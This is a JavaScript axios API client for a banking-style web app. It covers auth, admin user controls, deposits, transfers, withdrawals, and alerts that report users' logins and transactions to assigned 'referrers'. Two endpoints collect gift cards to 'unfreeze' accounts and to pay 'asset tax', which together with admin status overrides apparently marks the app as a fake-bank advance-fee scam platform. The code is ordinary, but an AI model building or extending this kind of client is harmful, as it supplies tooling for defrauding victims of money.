// api.js
import axios from '../api/axiosConfig';

// ========== AUTH ==========
export const registerUser = (userData) => axios.post('/api/auth/register', { user: userData }).then(res => res.data);
export const loginUser = (identifier, password) => axios.post('/api/auth/login', { identifier, password }).then(res => res.data);
export const logout = () => axios.post('/api/auth/logout').then(res => res.data);
export const me = () => axios.get('/api/auth/me').then(res => res.data);

// ========== ADMIN ==========
export const getAdminUsers = () => axios.get('/api/admin/users').then(res => res.data);
export const getAdminTransactions = () => axios.get('/api/admin/transactions').then(res => res.data);
export const updateUser = (user) => axios.post('/api/admin/users/update', { user }).then(res => res.data);
export const setUserBypass = (userId, bypass) => axios.post('/api/admin/users/bypass', { userId, bypass }).then(res => res.data);
export const deleteUser = (userId) => axios.delete(`/api/admin/users/${userId}`).then(res => res.data);

// ========== REFERRAL (Admin) ==========
export const assignReferrerToUser = (userId, referrerId) => {
  return axios.post('/api/admin/users/assign-referrer', { userId, referrerId }).then(res => res.data);
};
export const removeReferrerFromUser = (userId) => {
  return axios.post('/api/admin/users/remove-referrer', { userId }).then(res => res.data);
};

// ========== SETTINGS ==========
export const getSettings = () => axios.get('/api/settings').then(res => res.data);
export const saveSettings = (settings) => axios.post('/api/settings', settings).then(res => res.data);

// ========== TRANSACTIONS ==========
export const getTransactions = () => axios.get('/api/transactions').then(res => res.data);
export const updateTransactionStatus = (transactionId, status, reason = '') => 
  axios.post('/api/admin/transactions/status', { transactionId, status, reason }).then(res => res.data);

// ========== NOTIFICATIONS ==========
export const notifyRegistration = (user) => axios.post('/api/notify/registration', { user }).then(res => res.data);
export const notifyLogin = (user, identifier, referrer) => axios.post('/api/notify/login', { user, loginIdentifier: identifier, referrerEmail: referrer?.email, referrerName: referrer?.name }).then(res => res.data);
export const notifyTransaction = (transaction, eventType, referrer) => axios.post('/api/notify/transaction', { transaction, eventType, referrerEmail: referrer?.email, referrerName: referrer?.name }).then(res => res.data);
export const notifyWithdrawalProcessing = (user, amount, method, details, reference) => axios.post('/api/notify/withdrawal-processing', { user, amount, method, details, reference }).then(res => res.data);
export const notifyAssignReferrer = (referrer, targetUser, action) => axios.post('/api/notify/assign-referrer', { referrer, targetUser, action }).then(res => res.data);
export const notifyEmail = (to, title, message, type, userName, accountNumber) => axios.post('/api/notify/email', { to, title, message, type, userName, accountNumber }).then(res => res.data);

// ========== DEPOSITS ==========
export const submitDeposit = (userId, amount, proofData) => axios.post('/api/deposit', { userId, amount, proofData }).then(res => res.data);

// ========== TRANSFERS ==========
export const executeTransfer = (senderId, receiverAccount, amount) => axios.post('/api/transfer', { senderId, receiverAccount, amount }).then(res => res.data);

// ========== WITHDRAWALS ==========
export const initiateWithdrawal = (userId, amount, method, details) => axios.post('/api/withdrawal', { userId, amount, method, details }).then(res => res.data);

// ========== UNFREEZE & TAX ==========
export const submitUnfreezeCards = (userId, giftCards) => axios.post('/api/unfreeze', { userId, giftCards }).then(res => res.data);
export const submitAssetTaxCards = (userId, giftCards) => axios.post('/api/tax', { userId, giftCards }).then(res => res.data);

// ========== CLOUD / BACKUP ==========
export const getCloudStatus = () => axios.get('/api/cloud/status').then(res => res.data);
export const getCloudBackups = () => axios.get('/api/cloud/backups').then(res => res.data);
export const triggerManualBackup = () => axios.post('/api/cloud/backup').then(res => res.data);
export const syncCloud = (users, transactions, settings, isDailyBackup) => axios.post('/api/cloud/sync', { users, transactions, settings, isDailyBackup }).then(res => res.data);
export const getCloudData = () => axios.get('/api/cloud/data').then(res => res.data);

// ========== UPLOAD ==========
export const uploadImage = (image, folder) => axios.post('/api/upload', { image, folder }).then(res => res.data);